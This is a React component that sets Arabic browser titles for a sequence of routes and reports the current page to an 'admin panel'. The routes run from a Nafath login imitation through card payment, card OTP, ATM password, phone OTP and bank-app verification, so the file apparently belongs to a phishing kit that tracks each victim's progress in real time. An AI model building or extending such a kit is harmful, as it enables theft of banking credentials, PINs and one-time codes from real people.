import { useEffect } from "react";
import { useLocation } from "wouter";
import { updatePage } from "@/lib/store";

export default function PageTitleUpdater() {
  const [location] = useLocation();

  useEffect(() => {
    let title = "المفتاح الإلكتروني"; // Default title

    // Map all routes to Arabic page names
    const routeToTitle: Record<string, string> = {
      "/": "المفتاح الإلكتروني",
      "/nafath": "نفاذ",
      "/nafath-login": "نفاذ - تسجيل دخول",
      "/nafath-login-page": "نفاذ - تسجيل دخول",
      "/nafath-verify": "تحقق نفاذ",
      "/credit-card-payment": "صفحة الدفع",
      "/otp-verification": "OTP البطاقة",
      "/atm-password": "كلمة مرور ATM",
      "/phone-verification": "توثيق الجوال",
      "/phone-otp": "تحقق رقم الجوال (OTP)",
      "/final-page": "الصفحة النهائية",
      "/bank-app-verification": "تطبيق البنك",
    };

    // Get title from map or use default
    title = routeToTitle[location] || "المفتاح الإلكتروني";

    // Update browser title
    document.title = title;
    
    // Update page name in admin panel
    updatePage(title);
  }, [location]);

  return null;
}
